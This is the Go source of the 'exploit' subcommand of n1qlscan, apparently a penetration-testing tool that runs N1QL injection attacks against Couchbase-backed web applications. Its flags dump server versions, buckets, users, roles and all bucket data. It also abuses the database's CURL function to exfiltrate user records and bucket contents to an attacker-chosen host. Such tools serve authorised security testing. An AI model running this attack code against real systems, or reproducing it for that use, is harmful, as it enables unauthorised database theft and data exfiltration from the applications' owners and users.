/*
Copyright © 2025 FelSec <felesc@protonmail.com>
*/
package cmd

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/felsec/n1qlscan/internal/payloads"
	"github.com/felsec/n1qlscan/internal/scanner"
	"github.com/felsec/n1qlscan/internal/target"
	"github.com/felsec/n1qlscan/internal/util"
	"github.com/felsec/n1qlscan/internal/util/state"
	"github.com/manifoldco/promptui"
	"github.com/spf13/cobra"
	"github.com/spf13/pflag"
)

var (
	eUrlStr         string
	eRequestFileStr string
)

// exploitCmd represents the exploit command
var exploitCmd = &cobra.Command{
	Use:   "exploit {--url URL | --request File}",
	Short: "Dump data from a Couchbase instance",
	Long: `
███╗   ██╗ ██╗ ██████╗ ██╗     ███████╗ ██████╗ █████╗ ███╗   ██╗
████╗  ██║███║██╔═══██╗██║     ██╔════╝██╔════╝██╔══██╗████╗  ██║
██╔██╗ ██║╚██║██║   ██║██║     ███████╗██║     ███████║██╔██╗ ██║
██║╚██╗██║ ██║██║▄▄ ██║██║     ╚════██║██║     ██╔══██║██║╚██╗██║
██║ ╚████║ ██║╚██████╔╝███████╗███████║╚██████╗██║  ██║██║ ╚████║
╚═╝  ╚═══╝ ╚═╝ ╚══▀▀═╝ ╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
                                                                 
Run N1QL injection attacks against the target application.

Examples:
  URL
  n1qlscan exploit -u https://vulnerableapp.com/vulnpage?param=1 --get-cbversion

  Request File
  n1qlscan exploit -r ./vulnerable-request.txt --dump-all-buckets
`,
	PreRun: func(cmd *cobra.Command, args []string) {
		util.NoState = true
		eUrlStr, _ = cmd.Flags().GetString("url")
		eRequestFileStr, _ = cmd.Flags().GetString("request")
		if eUrlStr == "" && eRequestFileStr == "" {
			cmd.Help()
			util.LogErr("Missing required flags.\nPlease provide a target to exploit via the url or request flag!")
			os.Exit(0)
		}
		if eUrlStr != "" && eRequestFileStr != "" {
			cmd.Help()
			util.LogErr("Error: URL and request file provided.\nPlease provide a single target to exploit via the url or request flag!")
			os.Exit(0)
		}
	},
	Run: func(cmd *cobra.Command, args []string) {
		cmd.Printf(`
███╗   ██╗ ██╗ ██████╗ ██╗     ███████╗ ██████╗ █████╗ ███╗   ██╗
████╗  ██║███║██╔═══██╗██║     ██╔════╝██╔════╝██╔══██╗████╗  ██║
██╔██╗ ██║╚██║██║   ██║██║     ███████╗██║     ███████║██╔██╗ ██║
██║╚██╗██║ ██║██║▄▄ ██║██║     ╚════██║██║     ██╔══██║██║╚██╗██║
██║ ╚████║ ██║╚██████╔╝███████╗███████║╚██████╗██║  ██║██║ ╚████║
╚═╝  ╚═══╝ ╚═╝ ╚══▀▀═╝ ╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
                                                                 
`)
		currentTime := time.Now()
		cmd.Printf("Automated exploit start: %s\n", currentTime.Format("02/01/2006 15:04:05"))

		/*
			Workflow to implement
				- parse url or request file
				- check if project file exists
					+ if not - exit with error
				- check if path exists
					+ if not - exit with error
				- check for vulnerable endpoints file
					+ if not exists - exit with error
				- load vuln endpoint file
		*/
		var victim target.Target
		// Set attack verbose - for logging
		// Set attack TlsSkipVerify - Skip SSL/TLS verification
		scanner.Verbose, _ = cmd.Flags().GetBool("verbose")
		scanner.TlsSkipVerify, _ = cmd.Flags().GetBool("insecure")

		util.LogDate = currentTime.Format("20060102150405")

		// Set attack proxy
		scanner.Proxy, _ = cmd.Flags().GetString("proxy")

		switch {
		case eUrlStr != "":
			victim = target.ParseUrl(eUrlStr)
		case eRequestFileStr != "":
			victim = target.ParseReqFile(eRequestFileStr)
		}

		state.Domain = victim.Domain
		state.Method = victim.Method
		state.Path = strings.Join(victim.Path, ":")
		util.ProjectPath = state.GetProjectFolder()

		if !state.FolderExists(util.ProjectPath) {
			util.LogErr("Project folder does not exist. Run the scan command before attempting to exploit the target.")
			return
		}

		vulnDataFilePath := filepath.Join(state.GetProjectFolder(), "vulnerable.data")
		if !state.FolderExists(vulnDataFilePath) {
			util.LogErr("No vulnerable endpoints were identified. Run the scan command before attempting to exploit the target.")
			return
		}
		util.NoState = false

		forceSsl, _ := cmd.Flags().GetBool("force-ssl")
		if forceSsl {
			victim.SetProtocol("https")
		}

		headers, _ := cmd.Flags().GetStringSlice("header")
		for _, header := range headers {
			if strings.Contains(header, ":") {
				h := strings.SplitN(header, ":", 2)
				victim.AddHeader(h[0], h[1])
			} else {
				util.LogErr("An invalid header was provided.\nHeaders should be in format <Header Name>:<Header Value>.\nIgnoring the provided header.")
			}
		}

		cookies, _ := cmd.Flags().GetStringSlice("cookie")
		for _, cookie := range cookies {
			if strings.Contains(cookie, "=") {
				c := strings.SplitN(cookie, "=", 2)
				victim.AddCookie(c[0], c[1])
			} else {
				util.LogErr("An invalid cookie was provided.\nCookies should be in format <Cookie Name>=<Cookie Value>.\nIgnoring the provided cookie.")
			}
		}

		// Test connection to host
		checkConnection, _ := cmd.Flags().GetBool("skip-check")
		if !checkConnection {
			util.LogInfo("Checking connection to target application")
			// Test connection
			if !scanner.CheckConnection(victim) {
				util.LogErr("Unable to reach the application.")
				return
			}
		} else {
			util.LogInfo("Skpping connection check")
		}

		// Load the vulnerable endpoints from the vulnerable.data file
		vulnData := state.ReadVulnData()

		if len(vulnData) < 1 {
			util.LogErr("No vulnerable endpoints were identified. Run the scan command before attempting to exploit the target.")
			return
		}

		var vulnerableEndpoints []target.Vulnerable
		var menuItems []string

		for _, data := range vulnData {
			i, v := target.Deserialize(data)
			vulnerableEndpoints = append(vulnerableEndpoints, v)
			menuItems = append(menuItems, fmt.Sprintf("%d - %s - %s - %s", i, v.Parameter, v.ExploitType, v.ExamplePayload))
		}

		if len(vulnerableEndpoints) < 1 {
			util.LogErr("No vulnerable endpoints were identified. Run the scan command before attempting to exploit the target.")
			return
		}

		exploitTarget := vulnerableEndpoints[0]

		if len(vulnerableEndpoints) > 1 {
			// choose target and method
			// Steps:
			// 1 - Build a menu of the options
			// 2 - Use promptui to load the select menu
			// 3 - capture the response - exit on error
			// 4 - set chosen value to exploit target
			prompt := promptui.Select{
				Label: "Choose exploit target",
				Items: menuItems,
			}

			idx, _, err := prompt.Run()
			if err != nil {
				util.LogErr("Invalid selection made. Exiting")
				return
			}

			exploitTarget = vulnerableEndpoints[idx]
			if scanner.Verbose {
				util.LogVerbose(fmt.Sprintf("Attacking the application with the following configuration:\n%s", exploitTarget.VerboseString()))
			}
		}

		if threads, err := cmd.Flags().GetInt("threads"); err != nil {
			scanner.Threads = 8
		} else {
			scanner.Threads = threads
		}

		// Get dump options
		if ver, _ := cmd.Flags().GetBool("get-version"); ver {
			output := scanner.ExtractData(victim, exploitTarget, payloads.Version)
			util.LogInfo(fmt.Sprintf("N1QL Version: %s", output))
		}
		if nver, _ := cmd.Flags().GetBool("get-cbversion"); nver {
			output := scanner.ExtractData(victim, exploitTarget, payloads.CbVersion)
			util.LogInfo(fmt.Sprintf("Couchbase Server Version: %s", output))
		}
		if b, _ := cmd.Flags().GetBool("get-buckets"); b {
			output := scanner.ExtractData(victim, exploitTarget, payloads.BucketData)
			util.LogInfo(fmt.Sprintf("Bucket List: %s", output))
		}
		if k, _ := cmd.Flags().GetBool("get-keyspaces"); k {
			output := scanner.ExtractData(victim, exploitTarget, payloads.KeyspaceData)
			util.LogInfo(fmt.Sprintf("Keyspace List: %s", output))
		}
		if u, _ := cmd.Flags().GetBool("get-current-user"); u {
			output := scanner.ExtractData(victim, exploitTarget, payloads.CurrentUser)
			util.LogInfo(fmt.Sprintf("Current User: %s", output))
		}
		if r, _ := cmd.Flags().GetBool("get-roles"); r {
			output := scanner.ExtractData(victim, exploitTarget, payloads.CurrentUserRoles)
			util.LogInfo(fmt.Sprintf("Current User Roles: %s", output))
		}
		if p, _ := cmd.Flags().GetBool("get-prepared"); p {
			output := scanner.ExtractData(victim, exploitTarget, payloads.PreparedStatements)
			util.LogInfo(fmt.Sprintf("Prepared Statements List: %s", output))
		}
		if p, _ := cmd.Flags().GetBool("get-functions"); p {
			output := scanner.ExtractData(victim, exploitTarget, payloads.PreparedStatements)
			util.LogInfo(fmt.Sprintf("Functions List: %s", output))
		}
		if p, _ := cmd.Flags().GetBool("get-nodes"); p {
			output := scanner.ExtractData(victim, exploitTarget, payloads.NodeData)
			util.LogInfo(fmt.Sprintf("Node List: %s", output))
		}
		if p, _ := cmd.Flags().GetBool("is-admin"); p {
			output1 := scanner.ExtractData(victim, exploitTarget, payloads.IsAdminOne)
			output2 := scanner.ExtractData(victim, exploitTarget, payloads.IsAdminTwo)
			if output1 != "[]" || output2 != "[]" {
				util.LogInfo("The current user is an Admin")
			} else {
				util.LogInfo("The current user is not an Admin")
			}
		}

		if au, _ := cmd.Flags().GetBool("dump-users"); au {
			output := scanner.ExtractData(victim, exploitTarget, payloads.AllUsers)
			util.LogInfo(fmt.Sprintf("User List: %s", output))
		}
		if au, _ := cmd.Flags().GetString("dump-user"); au != "" {
			query := strings.ReplaceAll(payloads.SingleUser, "<user>", au)
			output := scanner.ExtractData(victim, exploitTarget, query)
			util.LogInfo(fmt.Sprintf("User Information: %s", output))
		}
		if dsb, _ := cmd.Flags().GetString("dump-bucket"); dsb != "" {
			query := strings.ReplaceAll(payloads.SingleBucket, "<bucket>", dsb)
			if scanner.CheckBucketExists(victim, exploitTarget, query) {
				output := scanner.ExtractBucketData(victim, exploitTarget, dsb)
				util.LogInfo(fmt.Sprintf("Bucket: %s\nData:\n%s", dsb, output))
			} else {
				util.LogErr("Specified bucket does not exist or the user does not have access to it.")
			}
		}
		if db, _ := cmd.Flags().GetBool("dump-all-buckets"); db {
			scanner.DumpAllBuckets(victim, exploitTarget)
		}

		if cc, _ := cmd.Flags().GetBool("can-curl"); cc {
			output := scanner.ExtractData(victim, exploitTarget, payloads.CurlPermissions)
			if output != "[]" {
				util.LogInfo("The current user can use the CURL function.")
			} else {
				util.LogInfo("The current user does not have permission to use the CURL function")
			}
		}

		var eh = ""
		if eh, _ = cmd.Flags().GetString("exfil-host"); eh != "" {
			if !util.CheckFormat(eh) {
				util.LogErr("The exfiltration target host does not match the format: http(s)://<host>:<port>/<endpoint>")
				return
			}
		}

		if ir, _ := cmd.Flags().GetBool("is-unrestricted"); ir {
			if eh == "" {
				util.LogErr("Please specify the target exfiltration host.")
				cmd.Help()
				return
			}
			query := strings.ReplaceAll(payloads.CurlCommand, "<ehost>", eh)
			query = strings.ReplaceAll(query, "<command>", "'Unrestricted'")
			scanner.RunCurlCommand(victim, exploitTarget, query)
			util.LogInfo("CURL command sent. Check the exfiltration host.")
		}

		if ed, _ := cmd.Flags().GetBool("exfil-version"); ed {
			if eh == "" {
				util.LogErr("Please specify the target exfiltration host.")
				cmd.Help()
				return
			}
			query := strings.ReplaceAll(payloads.CurlCommand, "<ehost>", eh)
			query = strings.ReplaceAll(query, "<command>", payloads.Version)
			scanner.RunCurlCommand(victim, exploitTarget, query)
			util.LogInfo("CURL command sent. Check the exfiltration host.")
		}

		if ed, _ := cmd.Flags().GetBool("exfil-cbversion"); ed {
			if eh == "" {
				util.LogErr("Please specify the target exfiltration host.")
				cmd.Help()
				return
			}
			query := strings.ReplaceAll(payloads.CurlCommand, "<ehost>", eh)
			query = strings.ReplaceAll(query, "<command>", payloads.CbVersion)
			scanner.RunCurlCommand(victim, exploitTarget, query)
			util.LogInfo("CURL command sent. Check the exfiltration host.")
		}

		if ed, _ := cmd.Flags().GetBool("exfil-bucketlist"); ed {
			if eh == "" {
				util.LogErr("Please specify the target exfiltration host.")
				cmd.Help()
				return
			}
			query := strings.ReplaceAll(payloads.CurlCommand, "<ehost>", eh)
			query = strings.ReplaceAll(query, "<command>", payloads.BucketData)
			scanner.RunCurlCommand(victim, exploitTarget, query)
			util.LogInfo("CURL command sent. Check the exfiltration host.")
		}

		if ed, _ := cmd.Flags().GetBool("exfil-keyspaces"); ed {
			if eh == "" {
				util.LogErr("Please specify the target exfiltration host.")
				cmd.Help()
				return
			}
			query := strings.ReplaceAll(payloads.CurlCommand, "<ehost>", eh)
			query = strings.ReplaceAll(query, "<command>", payloads.KeyspaceData)
			scanner.RunCurlCommand(victim, exploitTarget, query)
			util.LogInfo("CURL command sent. Check the exfiltration host.")
		}

		if eu, _ := cmd.Flags().GetBool("exfil-user"); eu {
			if eh == "" {
				util.LogErr("Please specify the target exfiltration host.")
				cmd.Help()
				return
			}
			query := strings.ReplaceAll(payloads.CurlCommand, "<ehost>", eh)
			query = strings.ReplaceAll(query, "<command>", payloads.CurrentUser)
			scanner.RunCurlCommand(victim, exploitTarget, query)
			util.LogInfo("CURL command sent. Check the exfiltration host.")
		}

		if eu, _ := cmd.Flags().GetBool("exfil-roles"); eu {
			if eh == "" {
				util.LogErr("Please specify the target exfiltration host.")
				cmd.Help()
				return
			}
			query := strings.ReplaceAll(payloads.CurlCommand, "<ehost>", eh)
			query = strings.ReplaceAll(query, "<command>", payloads.CurrentUserRoles)
			scanner.RunCurlCommand(victim, exploitTarget, query)
			util.LogInfo("CURL command sent. Check the exfiltration host.")
		}

		if eu, _ := cmd.Flags().GetBool("exfil-prepared"); eu {
			if eh == "" {
				util.LogErr("Please specify the target exfiltration host.")
				cmd.Help()
				return
			}
			query := strings.ReplaceAll(payloads.CurlCommand, "<ehost>", eh)
			query = strings.ReplaceAll(query, "<command>", payloads.PreparedStatements)
			scanner.RunCurlCommand(victim, exploitTarget, query)
			util.LogInfo("CURL command sent. Check the exfiltration host.")
		}

		if eu, _ := cmd.Flags().GetBool("exfil-functions"); eu {
			if eh == "" {
				util.LogErr("Please specify the target exfiltration host.")
				cmd.Help()
				return
			}
			query := strings.ReplaceAll(payloads.CurlCommand, "<ehost>", eh)
			query = strings.ReplaceAll(query, "<command>", payloads.Functions)
			scanner.RunCurlCommand(victim, exploitTarget, query)
			util.LogInfo("CURL command sent. Check the exfiltration host.")
		}

		if eu, _ := cmd.Flags().GetBool("exfil-nodes"); eu {
			if eh == "" {
				util.LogErr("Please specify the target exfiltration host.")
				cmd.Help()
				return
			}
			query := strings.ReplaceAll(payloads.CurlCommand, "<ehost>", eh)
			query = strings.ReplaceAll(query, "<command>", payloads.NodeData)
			scanner.RunCurlCommand(victim, exploitTarget, query)
			util.LogInfo("CURL command sent. Check the exfiltration host.")
		}

		if ebd, _ := cmd.Flags().GetString("exfil-bucket-data"); ebd != "" {
			query := strings.ReplaceAll(payloads.SingleBucket, "<bucket>", ebd)
			if scanner.CheckBucketExists(victim, exploitTarget, query) {
				scanner.ExfilBucketData(victim, exploitTarget, ebd, eh)
				util.LogInfo("CURL commands sent. Check the exfiltration host.")
			} else {
				util.LogErr("Specified bucket does not exist or the user does not have access to it.")
			}
		}

		if eab, _ := cmd.Flags().GetBool("exfil-all-bucket-data"); eab {
			scanner.ExfilAllBuckets(victim, exploitTarget, eh)
			util.LogInfo("CURL commands sent. Check the exfiltration host.")
		}

		if eau, _ := cmd.Flags().GetBool("exfil-all-user-data"); eau {
			query := strings.ReplaceAll(payloads.CurlCommand, "<ehost>", eh)
			query = strings.ReplaceAll(query, "<command>", payloads.AllUsers)
			scanner.RunCurlCommand(victim, exploitTarget, query)
			util.LogInfo("CURL command sent. Check the exfiltration host.")
		}

		if eud, _ := cmd.Flags().GetString("exfil-user-data"); eud != "" {
			query := strings.ReplaceAll(payloads.CurlCommand, "<ehost>", eh)
			query = strings.ReplaceAll(query, "<command>", strings.ReplaceAll(payloads.SingleUser, "<user>", eud))
			scanner.RunCurlCommand(victim, exploitTarget, query)
			util.LogInfo("CURL command sent. Check the exfiltration host.")
		}

	},
}

func init() {
	rootCmd.AddCommand(exploitCmd)

	util.NoState = true

	exploitCmd.SetFlagErrorFunc(func(cmd *cobra.Command, err error) error {
		cmd.Help()
		util.LogErr(err.Error())
		return nil
	})

	exploitCmd.Flags().SortFlags = false
	groups := []*pflag.FlagSet{}
	// Flags
	targetFlags := pflag.NewFlagSet("Target", pflag.ExitOnError)
	targetFlags.SortFlags = false
	targetFlags.StringP("url", "u", "", "Target URL (e.g. `https://vulnerableapp.com/vulnpage?param=1`)")
	targetFlags.StringP("request", "r", "", "Load a request from a file")
	groups = append(groups, targetFlags)
	exploitCmd.Flags().AddFlagSet(targetFlags)
	exploitCmd.MarkFlagsOneRequired("url", "request")
	exploitCmd.MarkFlagsMutuallyExclusive("url", "request")

	dumpFlags := pflag.NewFlagSet("System Information", pflag.ExitOnError)
	dumpFlags.SortFlags = false
	dumpFlags.Bool("get-version", false, "Dump the N1QL version information.")
	dumpFlags.Bool("get-cbversion", false, "Dump the Couchbase Server version information.")
	dumpFlags.Bool("get-buckets", false, "Dump the list of buckets.")
	dumpFlags.Bool("get-keyspaces", false, "Dump the list of non-system keyspaces.")
	dumpFlags.Bool("get-current-user", false, "Dump the current user.")
	dumpFlags.Bool("get-roles", false, "Dump the current user's role information.")
	dumpFlags.Bool("is-admin", false, "Checks if the current user is an admin.")
	dumpFlags.Bool("get-prepared", false, "Dump the list of prepared statements.")
	dumpFlags.Bool("get-functions", false, "Dump the list of user-defined functions.")
	dumpFlags.Bool("get-nodes", false, "Dump the list of nodes.")

	groups = append(groups, dumpFlags)
	exploitCmd.Flags().AddFlagSet(dumpFlags)

	dataDump := pflag.NewFlagSet("Data Dump", pflag.ExitOnError)
	dataDump.SortFlags = false
	// Dump all bucket data
	dataDump.Bool("dump-all-buckets", false, "Dump all the data from all buckets.")
	// Dump single bucket data
	dataDump.String("dump-bucket", "", "Dump the data from the specified bucket. (e.g. `BUCKET`)")
	// Dump all user data
	dataDump.Bool("dump-users", false, "Dump all users.")
	// Dump single user data
	dataDump.String("dump-user", "", "Dump specified user. (e.g. `USER`)")

	groups = append(groups, dataDump)
	exploitCmd.Flags().AddFlagSet(dataDump)

	settings := pflag.NewFlagSet("Optimisations", pflag.ExitOnError)
	settings.SortFlags = false
	settings.Int("threads", 8, "Max number of concurrent task")

	groups = append(groups, settings)
	exploitCmd.Flags().AddFlagSet(settings)
	// arguments to add - Curl and all options

	curlFlags := pflag.NewFlagSet("CURL Options", pflag.ExitOnError)
	curlFlags.SortFlags = false
	curlFlags.Bool("can-curl", false, "Checks if the current user can use the CURL function")
	curlFlags.Bool("is-unrestricted", false, "Check if the CURL is configured in unrestricted mode")
	// To Add: exfil each aspect of the above options
	curlFlags.Bool("exfil-version", false, "Exfiltrate the N1QL version information to the target host")
	curlFlags.Bool("exfil-cbversion", false, "Exfiltrate the Couchbase Server version information to the target host")
	curlFlags.Bool("exfil-bucketlist", false, "Exfiltrate the list of buckets to the target host")
	curlFlags.Bool("exfil-keyspaces", false, "Exfiltrate the list of non-system keyspaces to the target host")
	curlFlags.Bool("exfil-user", false, "Exfiltrate the current user information to the target host")
	curlFlags.Bool("exfil-roles", false, "Exfiltrate the current user's role information to the target host")
	curlFlags.Bool("exfil-prepared", false, "Exfiltrate the list of prepared statements to the target host")
	curlFlags.Bool("exfil-functions", false, "Exfiltrate the list of user-defined functions to the target host")
	curlFlags.Bool("exfil-nodes", false, "Exfiltrate the list of nodes to the target host")
	curlFlags.String("exfil-bucket-data", "", "Exfiltrate all the data from the specified bucket.")
	curlFlags.Bool("exfil-all-bucket-data", false, "Exfiltrate all the data from all the buckets.")
	curlFlags.String("exfil-user-data", "", "Exfiltrate the data for the specified user.")
	curlFlags.Bool("exfil-all-user-data", false, "Exfiltrate the data for all users.")

	curlFlags.String("exfil-host", "", "Target exfiltration host. Format: http(s)://<host>:<port>/<endpoint>")

	groups = append(groups, curlFlags)
	exploitCmd.Flags().AddFlagSet(curlFlags)

	exploitCmd.SetUsageFunc(func(c *cobra.Command) error {
		fmt.Println("Flags:")
		for _, fs := range groups {
			usage := fs.FlagUsages()
			desc := fs.Name() + ":"
			help := desc + "\n" + usage
			fmt.Println(help)
		}
		fmt.Println("Global Flags:")
		fmt.Println(c.Root().Flags().FlagUsages())
		return nil
	})
}
